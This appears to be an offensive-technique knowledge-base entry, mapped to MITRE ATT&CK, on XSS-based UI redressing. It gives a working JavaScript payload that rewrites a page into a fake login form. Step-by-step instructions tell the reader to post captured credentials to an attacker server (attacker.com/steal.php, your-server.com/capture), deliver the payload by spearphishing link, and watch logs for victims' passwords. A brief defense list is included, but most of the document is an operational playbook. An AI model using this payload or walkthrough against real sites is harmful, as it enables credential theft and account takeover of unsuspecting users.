---
id: 35d69678-213a-405d-9429-40052a532069
name: UI-Redressing-with-Fake-Login-Form-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.702455+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - '[[techniques/Phishing|T1566 - Phishing]]'
  - '[[techniques/Steal Web Session Cookie|T1539 - Steal Web Session Cookie]]'
sub_techniques:
  - >-
    [[sub-techniques/Spearphishing Attachment|T1566.001 - Spearphishing
    Attachment]]
tags:
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/Exploit code or POC]]'
  - '[[tags/UI redressing]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# UI-Redressing-with-Fake-Login-Form-Injection

## Summary

UI Redressing with Fake Login Form Injection is a phishing technique that leverages cross-site scripting (XSS) vulnerabilities to overlay a deceptive login form on a legitimate website, tricking users into entering credentials that are captured and sent to the attacker. This method exploits user trust in the site's appearance to facilitate credential theft without redirecting to an external phishing page.

## Description

This procedure involves injecting malicious HTML/JavaScript code into a vulnerable web application via an XSS vector, such as a reflected or stored input field. The injected script manipulates the browser's history and replaces the page's body content with a fake login form styled to mimic the legitimate one. When the victim interacts with the form and submits credentials, the data is exfiltrated to the attacker's controlled server. This attack is particularly effective against users who are already authenticated or browsing trusted sites, as it maintains the illusion of legitimacy. It targets web applications with insufficient input sanitization and can be delivered through spearphishing links containing the payload in URL parameters. The technique aligns with phishing campaigns aiming for credential access and can lead to account takeover or further lateral movement.

## Requirements

1. A web application vulnerable to XSS (reflected, stored, or DOM-based) where user input is not properly sanitized.
2. Access to craft and deliver a phishing link or payload to the target user.
3. An attacker-controlled server to receive stolen credentials (e.g., a simple HTTP endpoint).
4. Basic knowledge of HTML/JavaScript for payload customization.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using Content Security Policy - CSP) to prevent XSS execution.
- Deploy multi-factor authentication (MFA) to mitigate credential theft even if passwords are compromised.
- Educate users on recognizing phishing attempts, such as unexpected login prompts on trusted sites.
- Monitor for anomalous network traffic to unknown endpoints and enable browser-based protections like XSS auditors.

## Objectives

1. Inject a fake login form via XSS to deceive users into credential submission.
2. Capture and exfiltrate usernames and passwords to the attacker's server.
3. Achieve unauthorized access to victim accounts for further exploitation.

## Instructions

### Step 1: Identify the XSS Vulnerability

**Context**: Locate an input point (e.g., search field, URL parameter) in the target web application that reflects user input without sanitization. Test by injecting a simple payload like `<script>alert('XSS')</script>` to confirm execution.

**Verification**: If the alert pops up, the vulnerability is confirmed. Document the exact parameter or field (e.g., `?q=<payload>`).

### Step 2: Prepare the Fake Login Form Payload

**Context**: Use the provided code snippet to create the deceptive form. Customize the form's appearance to match the target's branding (e.g., add logos via CSS) and set the form's action attribute to post data to your server (e.g., `http://attacker.com/steal.php`).

**Code** ([[codes/UI-Redressing-Fake-Login-Form-Script]]):

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

> This script alters the browser's URL to mimic a login page and overwrites the page content with a basic fake form. Upon submission, modify the form tag to include `action='http://your-server.com/capture' method='POST'` and handle the POST on your server to log credentials. Expected output: The page reloads to show the fake form without errors.

### Step 3: Inject the Payload

**Context**: Encode the payload if necessary (e.g., URL-encode for GET parameters) and deliver it via a phishing email or direct link. For example, if the vuln is in `search?q=`, use `search?q=<script>...</script>`.

**Verification**: Visit the crafted URL in a test browser. The page should display the fake form, and submitting test credentials should send them to your server.

### Step 4: Monitor for Credential Capture

**Context**: Set up your receiving server to log incoming POST requests containing username and password fields.

**Verification**: Successful injection results in victim-submitted data appearing in your logs, confirming credential theft.
